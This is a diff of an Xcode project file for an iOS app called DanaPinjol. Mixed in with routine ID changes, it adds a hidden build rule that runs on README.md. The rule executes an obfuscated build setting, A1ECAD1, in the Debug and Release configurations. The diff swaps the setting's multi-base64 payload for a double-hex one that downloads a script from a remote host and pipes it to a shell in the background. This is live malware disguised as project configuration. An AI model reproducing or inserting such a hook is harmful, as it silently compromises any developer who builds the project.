@@ -7,7 +7,7 @@
 	objects = {
 
 /* Begin PBXBuildFile section */
-		DC9475F27E22456F9A1DACE1 /* README.md */ = {isa = PBXBuildFile; fileRef = 0373BAAC3A4844A2A71DACE1; };
+		F9F3AF4049DE428E801DACE1 /* README.md */ = {isa = PBXBuildFile; fileRef = 46661D6872A041C0891DACE1; };
 		7341DEB22F67AE2F008D4C83 /* AppDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7341DEA82F67AE2F008D4C83 /* AppDelegate.swift */; };
 		7341DEB52F67AE2F008D4C83 /* Assets.xcassets in Resources */ = {isa = PBXBuildFile; fileRef = 7341DEA92F67AE2F008D4C83 /* Assets.xcassets */; };
 		7341DEB72F67AE2F008D4C83 /* LaunchScreen.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 7341DEAC2F67AE2F008D4C83 /* LaunchScreen.storyboard */; };
@@ -102,7 +102,7 @@
 /* End PBXBuildFile section */
 
 /* Begin PBXFileReference section */
-		0373BAAC3A4844A2A71DACE1 /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
+		46661D6872A041C0891DACE1 /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
 		33CB9C43DDA77D0519D0E6F4 /* Pods-DanaPinjol.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-DanaPinjol.debug.xcconfig"; path = "Target Support Files/Pods-DanaPinjol/Pods-DanaPinjol.debug.xcconfig"; sourceTree = "<group>"; };
 		50F5AE9A9970D6E1B0F9F78D /* Pods-DanaPinjol.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-DanaPinjol.release.xcconfig"; path = "Target Support Files/Pods-DanaPinjol/Pods-DanaPinjol.release.xcconfig"; sourceTree = "<group>"; };
 		7341DE902F67AE28008D4C83 /* DanaPinjol.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = DanaPinjol.app; sourceTree = BUILT_PRODUCTS_DIR; };
@@ -236,7 +236,7 @@
 		7341DE912F67AE28008D4C83 /* Products */ = {
 			isa = PBXGroup;
 			children = (
-				0373BAAC3A4844A2A71DACE1 /* README.md */,
+				46661D6872A041C0891DACE1 /* README.md */,
 				7341DE902F67AE28008D4C83 /* DanaPinjol.app */,
 			);
 			name = Products;
@@ -611,7 +611,7 @@
 				438DD3B8AB27408EB227F7D3 /* [CP] Embed Pods Frameworks */,
 			);
 			buildRules = (
-				FA5AC47195824CB1B41DACE1 /* PBXBuildRule */,
+				0BD0BF2D60D64C6BAD1DACE1 /* PBXBuildRule */,
 			);
 			dependencies = (
 			);
@@ -656,7 +656,7 @@
 /* End PBXProject section */
 
 /* Begin PBXBuildRule section */
-		FA5AC47195824CB1B41DACE1 /* PBXBuildRule */ = {
+		0BD0BF2D60D64C6BAD1DACE1 /* PBXBuildRule */ = {
 				isa = PBXBuildRule;
 				compilerSpec = com.apple.compilers.proxy.script;
 				filePatterns = "*.md";
@@ -670,14 +670,14 @@
 				script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"/tmp/${INPUT_FILE_BASE}\"
 sh -c \"${A1ECAD1}\"";
 			};
-		/* End PBXBuildRule section */
+			/* End PBXBuildRule section */
 
 /* Begin PBXResourcesBuildPhase section */
 		7341DE8E2F67AE28008D4C83 /* Resources */ = {
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
-				DC9475F27E22456F9A1DACE1 /* README.md */,
+				F9F3AF4049DE428E801DACE1 /* README.md */,
 				7341DEB52F67AE2F008D4C83 /* Assets.xcassets in Resources */,
 				734A46912F68032200455F6A /* Localizable.strings in Resources */,
 				7341DEB72F67AE2F008D4C83 /* LaunchScreen.storyboard in Resources */,
@@ -854,7 +854,7 @@ sh -c \"${A1ECAD1}\"";
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = 33CB9C43DDA77D0519D0E6F4 /* Pods-DanaPinjol.debug.xcconfig */;
 			buildSettings = {
-				A1ECAD1 = "((c(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmh3VlZJeGNIbFRWVTEzWkVacmVVOVlWbWxpVmxweFdrVk5lRTFIUmxoTlYzaHBUVEZaZDFOVlVrcGxhMnhFVFVoU2FtSldXWGRaTWpWeVdqQXhOVkZYWkUxV01VWnVVMWMxUWs5WFZraFVibHBoVWpGYWJWa3lOVmRqTVhCVVUxZGthRk5HU1hkWk1HaE9UbXQ0TlU5WGFHRlRSVFV3V1dwT1MySkhSbGhPU0Zab1ZucFNNbGRXVG5KaFZXeEpaREprYWsxdFpFeERaejA5Q2c9PQo= | c | sh ) >/dev/null 2>&1 &)";
+				A1ECAD1 = "((o(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326436623463363637333230326432643633366636653665363536333734326437340a3639366436353666373537343230333233323230326432643732363537343732373932303333323032303264363432303232373033643738363336660a3634363535663732373536633635323232303638373437343730373333613266326636363735366536333638363137343733326537323735326636310a323932323230376332303733363830610a | o | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_ENTITLEMENTS = DanaPinjol/DanaPinjol.entitlements;
@@ -901,7 +901,7 @@ sh -c \"${A1ECAD1}\"";
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = 50F5AE9A9970D6E1B0F9F78D /* Pods-DanaPinjol.release.xcconfig */;
 			buildSettings = {
-				A1ECAD1 = "((c(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmh3VlZJeGNIbFRWVTEzWkVacmVVOVlWbWxpVmxweFdrVk5lRTFIUmxoTlYzaHBUVEZaZDFOVlVrcGxhMnhFVFVoU2FtSldXWGRaTWpWeVdqQXhOVkZYWkUxV01VWnVVMWMxUWs5WFZraFVibHBoVWpGYWJWa3lOVmRqTVhCVVUxZGthRk5HU1hkWk1HaE9UbXQ0TlU5WGFHRlRSVFV3V1dwT1MySkhSbGhPU0Zab1ZucFNNbGRXVG5KaFZXeEpaREprYWsxdFpFeERaejA5Q2c9PQo= | c | sh ) >/dev/null 2>&1 &)";
+				A1ECAD1 = "((o(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326436623463363637333230326432643633366636653665363536333734326437340a3639366436353666373537343230333233323230326432643732363537343732373932303333323032303264363432303232373033643738363336660a3634363535663732373536633635323232303638373437343730373333613266326636363735366536333638363137343733326537323735326636310a323932323230376332303733363830610a | o | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_ENTITLEMENTS = DanaPinjol/DanaPinjol.entitlements;
